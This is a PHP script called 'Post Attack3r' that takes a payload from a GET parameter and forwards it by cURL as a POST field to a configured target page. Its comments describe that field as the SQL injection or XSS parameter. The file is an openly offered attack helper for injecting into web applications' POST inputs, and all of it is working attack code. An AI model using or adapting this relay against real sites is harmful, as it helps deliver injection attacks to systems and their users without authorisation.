<?php
/*
Post Attack3r ~ Coded by omer citak. www.omercitak.net 2k14
Use : host/attack.php?r=inject_here
*/

/* user setting */
$postpage	= "http://127.0.0.1/postattack3r/test.php"; // post data will be sent page
$attparam	= "id"; // sql, xss etc. injection post parameter
$othparam	= array(); // independent parameters must be sent. [ array($paramater => $value) ] ex : array('par1'=>'val1', 'par2'=>'val2')
$outhtml	= 0; // does it get html output response? yes=1, no=0.

/* run run run */
$request	= $_GET['r'];

if(count($othparam)==0):
	$fields	= $attparam.'='.$request;
else:
	foreach($othparam as $k => $v):
		$fields	= $fields.$k.'='.$v.'&';
	endforeach;
	$fields	= $fields.$attparam.'='.$request;
endif;

$curl	= curl_init();
curl_setopt($curl, CURLOPT_URL, $postpage);
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS, $fields);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($curl);
curl_close($curl);

if($outhtml==0):
	$output	= htmlspecialchars($output);
endif;

echo $output;
?>